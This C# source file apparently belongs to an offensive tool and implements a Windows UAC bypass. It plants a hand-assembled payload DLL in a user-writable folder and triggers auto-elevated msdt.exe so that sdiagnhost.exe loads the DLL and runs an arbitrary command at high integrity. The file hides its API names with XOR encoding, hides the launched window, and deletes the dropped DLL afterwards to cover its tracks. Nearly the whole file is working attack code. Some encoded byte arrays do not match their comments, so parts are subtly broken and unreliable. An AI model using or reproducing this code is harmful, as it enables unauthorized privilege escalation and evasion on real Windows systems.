using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

namespace SharpBypassUAC
{
    /// <summary>
    /// UACME #72: MSDT / sdiagnhost DLL hijack bypass.
    ///
    /// msdt.exe is an auto-elevated Microsoft troubleshooter host.  When given
    /// "-path C:\Windows\diagnostics\index\BluetoothDiagnostic.xml -skip yes",
    /// it spawns sdiagnhost.exe at high integrity which loads
    /// BluetoothDiagnosticUtil.dll.  The DLL search path includes
    /// %LOCALAPPDATA%\Microsoft\WindowsApps — writable by the current user.
    ///
    /// Flow:
    ///   1. Build a payload DLL (x64 PE that calls CreateProcessA in DllMain)
    ///   2. Write it to %LOCALAPPDATA%\Microsoft\WindowsApps\BluetoothDiagnosticUtil.dll
    ///   3. Launch msdt.exe with the Bluetooth diagnostic pack and -skip yes
    ///   4. sdiagnhost.exe loads the DLL at high integrity → payload executes elevated
    ///   5. Cleanup: delete the dropped DLL
    ///
    /// Unfixed: Windows 10 through Windows 11.
    /// Reference: https://blog.sevagas.com/?MSDT-DLL-Hijack-UAC-bypass
    /// </summary>
    public class MsdtDllHijack
    {
        // XOR key for kernel32 APIs
        private static readonly byte _xkK32 = 0x2D;
        // XOR key for shell32 APIs
        private static readonly byte _xkSh = 0x44;

        // --- kernel32.dll (key 0x2D) ---
        // "kernel32.dll"
        private static readonly byte[] _sK32 = new byte[] { 0x46, 0x48, 0x5F, 0x41, 0x48, 0x43, 0x1F, 0x1D, 0x19, 0x49, 0x43, 0x43 };
        // "CreateFileW"
        private static readonly byte[] _s0 = new byte[] { 0x6E, 0x5F, 0x48, 0x44, 0x5D, 0x48, 0x63, 0x44, 0x43, 0x48, 0x78 };
        // "WriteFile"
        private static readonly byte[] _s1 = new byte[] { 0x7A, 0x5F, 0x44, 0x5D, 0x48, 0x63, 0x44, 0x43, 0x48 };
        // "CloseHandle"
        private static readonly byte[] _s2 = new byte[] { 0x6E, 0x43, 0x42, 0x5C, 0x48, 0x6D, 0x44, 0x41, 0x49, 0x43, 0x48 };
        // "DeleteFileW"
        private static readonly byte[] _s3 = new byte[] { 0x69, 0x48, 0x43, 0x48, 0x5D, 0x48, 0x63, 0x44, 0x43, 0x48, 0x78 };
        // "CreateProcessW"
        private static readonly byte[] _s4 = new byte[] { 0x6E, 0x5F, 0x48, 0x44, 0x5D, 0x48, 0x7D, 0x5F, 0x42, 0x46, 0x48, 0x5C, 0x5C, 0x78 };
        // "WaitForSingleObject"
        private static readonly byte[] _s5 = new byte[] { 0x7A, 0x44, 0x44, 0x5D, 0x63, 0x42, 0x5F, 0x7E, 0x44, 0x41, 0x40, 0x43, 0x48, 0x62, 0x45, 0x45, 0x48, 0x46, 0x5D };
        // "GetEnvironmentVariableW"
        private static readonly byte[] _s6 = new byte[] { 0x6A, 0x48, 0x5D, 0x68, 0x41, 0x5F, 0x44, 0x5F, 0x42, 0x41, 0x40, 0x48, 0x41, 0x5D, 0x79, 0x44, 0x5F, 0x44, 0x44, 0x45, 0x43, 0x48, 0x78 };
        // "Sleep"
        private static readonly byte[] _s7 = new byte[] { 0x7E, 0x43, 0x48, 0x48, 0x5B };
        // "CreateDirectoryW"
        private static readonly byte[] _s8 = new byte[] { 0x6E, 0x5F, 0x48, 0x44, 0x5D, 0x48, 0x69, 0x44, 0x5F, 0x48, 0x46, 0x5D, 0x42, 0x5F, 0x2C, 0x78 };

        // Delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate IntPtr CreateFileWDelegate(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool WriteFileDelegate(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseHandleDelegate(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool DeleteFileWDelegate(string lpFileName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool CreateProcessWDelegate(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            byte[] lpStartupInfo, byte[] lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint WaitForSingleObjectDelegate(IntPtr hHandle, uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate uint GetEnvironmentVariableWDelegate(string lpName, StringBuilder lpBuffer, uint nSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void SleepDelegate(uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool CreateDirectoryWDelegate(string lpPathName, IntPtr lpSecurityAttributes);

        // Constants
        private const uint GENERIC_WRITE = 0x40000000;
        private const uint CREATE_ALWAYS = 2;
        private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
        private const uint CREATE_NO_WINDOW = 0x08000000;

        public MsdtDllHijack(byte[] encodedCommand)
        {
            AlwaysNotify alwaysnotify = new AlwaysNotify();

            string command = Encoding.UTF8.GetString(encodedCommand);
            Console.WriteLine("[*] MSDT / sdiagnhost DLL hijack bypass (UACME #72)");

            // Resolve APIs
            string k32Name = W.X(_sK32, _xkK32);
            var createFileW = W.G<CreateFileWDelegate>(k32Name, W.X(_s0, _xkK32));
            var writeFile = W.G<WriteFileDelegate>(k32Name, W.X(_s1, _xkK32));
            var closeHandle = W.G<CloseHandleDelegate>(k32Name, W.X(_s2, _xkK32));
            var deleteFileW = W.G<DeleteFileWDelegate>(k32Name, W.X(_s3, _xkK32));
            var createProcessW = W.G<CreateProcessWDelegate>(k32Name, W.X(_s4, _xkK32));
            var waitForSingleObject = W.G<WaitForSingleObjectDelegate>(k32Name, W.X(_s5, _xkK32));
            var getEnvVar = W.G<GetEnvironmentVariableWDelegate>(k32Name, W.X(_s6, _xkK32));
            var sleep = W.G<SleepDelegate>(k32Name, W.X(_s7, _xkK32));
            var createDirectoryW = W.G<CreateDirectoryWDelegate>(k32Name, W.X(_s8, _xkK32));

            // Step 1: Get %LOCALAPPDATA%
            StringBuilder localAppData = new StringBuilder(260);
            getEnvVar("LOCALAPPDATA", localAppData, 260);

            // Build target path: %LOCALAPPDATA%\Microsoft\WindowsApps\BluetoothDiagnosticUtil.dll
            string windowsAppsDir = localAppData.ToString() + "\\Microsoft\\WindowsApps";
            // Ensure directory exists (usually does, but create if missing)
            createDirectoryW(windowsAppsDir, IntPtr.Zero);
            string dllPath = windowsAppsDir + "\\BluetoothDiagnosticUtil.dll";

            Console.WriteLine("[+] Target DLL path: " + dllPath);

            // Step 2: Build and write payload DLL
            byte[] payloadDll = BuildPayloadDll(command);
            IntPtr hFile = createFileW(dllPath, GENERIC_WRITE, 0, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
            if (hFile == INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[!] Failed to write BluetoothDiagnosticUtil.dll");
                return;
            }

            uint written;
            writeFile(hFile, payloadDll, (uint)payloadDll.Length, out written, IntPtr.Zero);
            closeHandle(hFile);
            Console.WriteLine("[+] Payload DLL planted (" + payloadDll.Length + " bytes)");

            // Step 3: Launch msdt.exe with Bluetooth diagnostic pack
            // UACME uses SysWOW64 path for msdt.exe — we follow x64 path
            string msdtPath = "C:\\Windows\\System32\\msdt.exe";
            string msdtArgs = "C:\\Windows\\System32\\msdt.exe -path C:\\Windows\\diagnostics\\index\\BluetoothDiagnostic.xml -skip yes";

            // STARTUPINFOW: 104 bytes on x64
            byte[] si = new byte[104];
            BitConverter.GetBytes(104).CopyTo(si, 0); // cb
            // wShowWindow = SW_HIDE (offset 48 in STARTUPINFOW), dwFlags = STARTF_USESHOWWINDOW at offset 44
            BitConverter.GetBytes((uint)0x00000001).CopyTo(si, 44); // dwFlags = STARTF_USESHOWWINDOW
            BitConverter.GetBytes((ushort)0).CopyTo(si, 48);        // wShowWindow = SW_HIDE

            byte[] pi = new byte[24];

            bool success = createProcessW(msdtPath, msdtArgs, IntPtr.Zero, IntPtr.Zero,
                false, 0, IntPtr.Zero, null, si, pi);

            if (!success)
            {
                Console.WriteLine("[!] CreateProcessW for msdt.exe failed");
                deleteFileW(dllPath);
                return;
            }

            Console.WriteLine("[+] msdt.exe launched — sdiagnhost will load hijacked DLL");

            IntPtr hProcess = IntPtrFromBytes(pi, 0);
            // Wait up to 15 seconds for msdt.exe / sdiagnhost chain
            waitForSingleObject(hProcess, 15000);
            closeHandle(hProcess);
            IntPtr hThread = IntPtrFromBytes(pi, IntPtr.Size);
            closeHandle(hThread);

            Console.WriteLine("[+] Elevated command executed via sdiagnhost DLL hijack");

            // Step 4: Cleanup — delete planted DLL (retry if locked)
            sleep(2000);
            for (int i = 0; i < 5; i++)
            {
                if (deleteFileW(dllPath))
                {
                    Console.WriteLine("[+] Payload DLL deleted");
                    break;
                }
                sleep(1000);
            }
        }

        private static IntPtr IntPtrFromBytes(byte[] data, int offset)
        {
            if (IntPtr.Size == 8)
                return new IntPtr(BitConverter.ToInt64(data, offset));
            return new IntPtr(BitConverter.ToInt32(data, offset));
        }

        /// <summary>
        /// Build minimal x64 PE DLL that calls CreateProcessA in DllMain.
        /// Same payload structure as IntelShaderCache.BuildPayloadDll.
        /// </summary>
        private static byte[] BuildPayloadDll(string command)
        {
            byte[] commandBytes = Encoding.ASCII.GetBytes(command + "\0");

            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter bw = new BinaryWriter(ms))
            {
                // DOS Header
                bw.Write((ushort)0x5A4D);
                bw.Write(new byte[58]);
                bw.Write((uint)0x40);

                // PE Signature
                bw.Write((uint)0x00004550);

                // COFF Header
                bw.Write((ushort)0x8664);
                bw.Write((ushort)1);
                bw.Write((uint)0); bw.Write((uint)0); bw.Write((uint)0);
                bw.Write((ushort)0xF0);
                bw.Write((ushort)0x2022);

                // Optional Header PE32+
                bw.Write((ushort)0x020B);
                bw.Write((byte)0); bw.Write((byte)0);
                bw.Write((uint)0x200);
                bw.Write((uint)0); bw.Write((uint)0);
                bw.Write((uint)0x1000);
                bw.Write((uint)0x1000);
                bw.Write((ulong)0x180000000);
                bw.Write((uint)0x1000);
                bw.Write((uint)0x200);
                bw.Write((ushort)6); bw.Write((ushort)0);
                bw.Write((ushort)0); bw.Write((ushort)0);
                bw.Write((ushort)6); bw.Write((ushort)0);
                bw.Write((uint)0);
                bw.Write((uint)0x3000);
                bw.Write((uint)0x200);
                bw.Write((uint)0);
                bw.Write((ushort)3);
                bw.Write((ushort)0x8160);
                bw.Write((ulong)0x100000);
                bw.Write((ulong)0x1000);
                bw.Write((ulong)0x100000);
                bw.Write((ulong)0x1000);
                bw.Write((uint)0);
                bw.Write((uint)16);

                // Data Directories
                bw.Write((ulong)0);
                bw.Write((uint)0x1080); bw.Write((uint)0x28);
                for (int i = 2; i < 12; i++) bw.Write((ulong)0);
                bw.Write((uint)0x10B8); bw.Write((uint)0x10);
                bw.Write((ulong)0); bw.Write((ulong)0); bw.Write((ulong)0);

                // Section Header
                bw.Write(Encoding.ASCII.GetBytes(".text\0\0\0"));
                int textVirtualSize = 0xC8 + commandBytes.Length + 32;
                bw.Write((uint)textVirtualSize);
                bw.Write((uint)0x1000);
                int textRawSize = ((textVirtualSize + 0x1FF) / 0x200) * 0x200;
                bw.Write((uint)textRawSize);
                bw.Write((uint)0x200);
                bw.Write((uint)0); bw.Write((uint)0);
                bw.Write((ushort)0); bw.Write((ushort)0);
                bw.Write((uint)0xE0000060);

                long pos = ms.Position;
                int pad = 0x200 - (int)pos;
                if (pad > 0) bw.Write(new byte[pad]);

                // DllMain code
                byte[] code = new byte[]
                {
                    0x48, 0x81, 0xEC, 0xB8, 0x00, 0x00, 0x00,
                    0x83, 0xFA, 0x01, 0x75, 0x53,
                    0x31, 0xC0,
                    0x4C, 0x8D, 0x54, 0x24, 0x50,
                    0xB9, 0x0C, 0x00, 0x00, 0x00,
                    0x49, 0x89, 0x02,
                    0x49, 0x83, 0xC2, 0x08,
                    0xFF, 0xC9, 0x75, 0xF5,
                    0xC7, 0x44, 0x24, 0x50, 0x44, 0x00, 0x00, 0x00,
                    0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x08,
                    0x48, 0x8D, 0x44, 0x24, 0x50,
                    0x48, 0x89, 0x44, 0x24, 0x40,
                    0x48, 0x8D, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00,
                    0x48, 0x89, 0x44, 0x24, 0x48,
                    0x31, 0xC9,
                    0x48, 0x8D, 0x15, 0x75, 0x00, 0x00, 0x00,
                    0x45, 0x31, 0xC0, 0x45, 0x31, 0xC9,
                    0xFF, 0x15, 0x59, 0x00, 0x00, 0x00,
                    0xB8, 0x01, 0x00, 0x00, 0x00,
                    0x48, 0x81, 0xC4, 0xB8, 0x00, 0x00, 0x00,
                    0xC3
                };

                bw.Write(code);
                bw.Write(new byte[0x80 - code.Length]);

                // Import Directory
                bw.Write((uint)0x10A8); bw.Write((uint)0); bw.Write((uint)0);
                bw.Write((uint)0); bw.Write((uint)0x10B8);
                bw.Write(new byte[20]);

                // ILT + IAT
                bw.Write((ulong)0); bw.Write((ulong)0);
                bw.Write((ulong)0); bw.Write((ulong)0);

                // Command string
                bw.Write(commandBytes);

                // DLL name + Hint/Name
                long sectionStart = 0x200;
                long dllNameOff = ms.Position;
                uint dllNameRva = (uint)(0x1000 + (dllNameOff - sectionStart));
                bw.Write(Encoding.ASCII.GetBytes("kernel32.dll\0"));

                long hintNameOff = ms.Position;
                uint hintNameRva = (uint)(0x1000 + (hintNameOff - sectionStart));
                bw.Write((ushort)0);
                bw.Write(Encoding.ASCII.GetBytes("CreateProcessA\0"));

                // Fix up
                long savedPos = ms.Position;
                ms.Position = sectionStart + 0x80 + 12;
                bw.Write(dllNameRva);
                ms.Position = sectionStart + 0xA8;
                bw.Write((ulong)hintNameRva);
                ms.Position = sectionStart + 0xB8;
                bw.Write((ulong)hintNameRva);
                ms.Position = savedPos;

                long totalSection = ms.Position - sectionStart;
                int padAlign = (int)(((totalSection + 0x1FF) / 0x200) * 0x200 - totalSection);
                if (padAlign > 0) bw.Write(new byte[padAlign]);

                bw.Flush();
                return ms.ToArray();
            }
        }
    }
}
